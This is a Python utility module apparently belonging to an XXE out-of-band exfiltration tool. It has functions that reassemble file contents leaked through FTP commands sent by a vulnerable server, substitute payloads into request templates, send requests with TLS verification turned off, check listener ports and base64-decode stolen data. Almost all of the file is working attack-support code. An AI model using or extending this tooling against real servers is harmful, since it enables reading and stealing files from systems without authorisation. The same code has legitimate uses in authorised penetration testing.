import socket
import requests
from json import loads
from io import StringIO
from base64 import b64decode
from email import message_from_file


# parse exfiltrated file content from FTP commands provided by the vulnerable server via the ftp:// URI scheme
def parse_ftp(data):
	if '\n' not in data.replace('\r\n', '') and not data.startswith('CWD ') and not data.startswith('RETR '):
		return ''
	
	pieces = []
	for x in data.split('\r\n'):
		if x.startswith('CWD ') or x.startswith('RETR '):
			pieces.append(' '.join(x.split(' ')[1:]))
		else:
			pieces.append(x)

	return ''.join(pieces)


# parse wordlist file and return list of words contained in it, False if an error occurs while parsing it (probably file does not exist or permission denied)
def parse_wordlist(wl):
	try:
		return [x.replace('\r', '').replace('\n', '') for x in open(wl).readlines() if x]
	except Exception as e:
		print('[X] Exception "{}" encountered while parsing wordlist file "{}"\n[-] Exiting'.format(type(e).__name__, wl))
		exit(1)


# parse request file for automatic mode
def parse_requestfile(reqfile, payload):
	try:
		reqdata = open(reqfile).read()
	except Exception as e:
		print('[X] Exception "{}" encountered while opening request file "{}"\n[-] Exiting'.format(type(e).__name__, reqfile))
		exit(1)

	try:
		reqdata = loads(reqdata)
		return {'url' : reqdata['url'], 'method' : reqdata['method'], 'headers' : dict(message_from_file(StringIO(reqdata['headers']))), 'body' : reqdata['body'].format(PAYLOAD=payload)}
	except Exception as e:
		print('[X] Exception "{}" encountered while parsing request file\n[-] Exiting'.format(type(e).__name__))
		exit(1)


# function for asynchronously fire an HTTP request (called using Thread class) without waiting for response
def async_request(reqdata):
	requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
	try:
		requests.request(reqdata['method'], reqdata['url'], headers=reqdata['headers'], data=reqdata['body'], verify=False, timeout=0.00000001)
	except:
		return


# check if it is possible to safely bind a socket connection without errors
def check_bindport(addr, port):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind((addr, port))
		s.listen(1)
		s.close()
		return None
	except Exception as e:
		return e


# handle common bind exceptions
def common_bind_exception(exc, addr, port):
	if type(exc).__name__ == 'OSError':
		print('[X] Error while binding address {} on port {}: Address already in use\n[-] Exiting'.format(addr, port))
		exit(1)

	if type(exc).__name__ == 'PermissionError':
		print('[X] Error while binding address {} on port {}: Permission denied\n[-] Exiting'.format(addr, port))
		exit(1)

	return False


# convert exfiltrated content from base64
def convert_base64(content, retry=0):
	# strip first "/" character (probably encountered while parsing FTP cmdlines)
	if content.startswith('/'):
		content = content[1:]

	try:
		return b64decode(content).decode()
	
	except Exception as e:
		if retry == 2:
			print('[X] Exception "{}" encountered while decoding content "{}" from base64\n[-] Exiting'.format(type(e).__name__, content))
			exit(1)	

		# equals are sometimes stripped, retry 2 times adding every time a "=" character
		return convert_base64(content+'=', retry+1)